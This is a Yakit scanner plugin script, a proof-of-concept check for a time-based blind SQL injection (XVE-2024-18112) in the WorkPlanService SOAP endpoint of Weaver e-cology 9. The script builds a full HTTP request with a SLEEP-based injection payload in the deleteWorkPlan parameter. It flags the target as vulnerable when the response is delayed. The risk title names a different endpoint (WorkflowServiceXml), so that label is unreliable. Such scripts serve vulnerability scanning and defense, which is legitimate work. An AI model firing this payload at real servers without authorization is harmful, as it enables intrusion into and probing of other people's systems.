script_name: 泛微e-cology9接口WorkPlanService 前台SQL注入漏洞(XVE-2024-18112)
content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /services/WorkPlanService HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Length: 422
Connection: close
Content-Type: text/xml
Accept-Encoding: gzip

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
    <soapenv:Header/>
      <soapenv:Body>
      <web:deleteWorkPlan>
         <!--type: string-->
         <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)</web:in0>
         <!--type: int-->
         <web:in1>22</web:in1> 
      </web:deleteWorkPlan>
      </soapenv:Body>
</soapenv:Envelope>`



    begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(6),
    )
    resp_time=time.Since(begin_time)
    if int(resp_time) > 5000000000{
        yakit.Info("%v found 泛微e-cology 9 WorkflowServiceXml SQL注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("泛微e-cology 9 WorkflowServiceXml SQL注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("泛微e-cology 9 WorkflowServiceXml SQL注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
